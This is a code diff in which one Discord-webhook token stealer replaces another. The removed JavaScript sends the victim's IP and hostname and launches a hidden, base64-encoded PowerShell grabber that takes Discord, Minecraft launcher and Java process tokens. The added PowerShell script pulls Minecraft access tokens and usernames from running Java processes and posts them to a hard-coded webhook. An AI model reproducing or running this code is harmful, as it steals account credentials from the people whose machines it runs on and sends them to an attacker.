@@ -1,63 +1,30 @@
-const Runtime = Java.type('java.lang.Runtime');
-const BufferedReader = Java.type('java.io.BufferedReader');
-const InputStreamReader = Java.type('java.io.InputStreamReader');
-const WEBHOOK = 'https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc';
+$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
-function send(content) {
-    try {
-        const URL = Java.type('java.net.URL');
-        const url = new URL(WEBHOOK);
-        const conn = url.openConnection();
-        conn.setRequestMethod('POST');
-        conn.setRequestProperty('Content-Type', 'application/json');
-        conn.setDoOutput(true);
-        const writer = new java.io.OutputStreamWriter(conn.getOutputStream(), 'UTF-8');
-        writer.write(JSON.stringify({ content: content }));
-        writer.flush();
-        writer.close();
-        conn.getResponseCode();
-    } catch(e) {}
-}
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $accessToken = $null
+        $username = $null
 
-// IP
-try {
-    const url = new URL('https://api.ipify.org');
-    const conn = url.openConnection();
-    const reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-    const ip = reader.readLine();
-    reader.close();
-    send('**[SYSTEM]**\nIP: ' + ip + '\nHost: ' + java.net.InetAddress.getLocalHost().getHostName());
-} catch(e) {}
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+        }
+        if ($_ -match '--username\s+(\S+)') {
+            $username = $matches[1]
+        }
 
-// PowerShell команда для сбора токенов
-const psScript = `
-$webhook = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
-function s($m) { $b = @{content=$m}|ConvertTo-Json; try{Invoke-RestMethod -Uri $webhook -Method Post -Body $b -ContentType "application/json"}catch{} }
+        if ($accessToken -and $username) {
+            $message = @"
+> **AccessToken:** $accessToken
+> **Username:** $username
+"@
 
-# Discord tokens
-$paths = @("$env:LOCALAPPDATA\\Discord\\Local Storage\\leveldb", "$env:LOCALAPPDATA\\discordcanary\\Local Storage\\leveldb")
-foreach($p in $paths){
-    if(Test-Path $p){
-        Get-ChildItem "$p\\*.ldb"|%{$c=Get-Content $_.FullName -Raw;[regex]::Matches($c,'[\\w-]{24,}\\.[\\w-]{6,}\\.[\\w-]{27,}')|%{s "**[DC TOKEN]**\`n\`\`\`$($_.Value)\`\`\`"}}
+            Write-Output $message
+
+            $payload = @{
+                content = $message
+            } | ConvertTo-Json -Depth 10
+
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+        }
     }
-}
-
-# Minecraft tokens
-$mc = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\.minecraft\\launcher_profiles.json"
-if(Test-Path $mc){
-    $d = Get-Content $mc -Raw|ConvertFrom-Json
-    if($d.accessToken){ s "**[MC SESSION]**\`n\`\`\`$($d.accessToken)\`\`\`" }
-    if($d.clientToken){ s "**[MC CLIENT]**\`n\`\`\`$($d.clientToken)\`\`\`" }
-}
-
-# Java process tokens
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'"|%{
-    if($_.CommandLine -match '--accessToken\\s+(\\S+)'){
-        s "**[JAVA TOKEN]**\`n\`\`\`$($Matches[1])\`\`\`"
-    }
-}
-`;
-
-const encoded = java.util.Base64.getEncoder().encodeToString(psScript.getBytes('UTF-16LE'));
-Runtime.getRuntime().exec('powershell.exe -NoP -NonI -W Hidden -Enc ' + encoded);
-send('**[PS EXECUTED]** PowerShell token grabber launched');
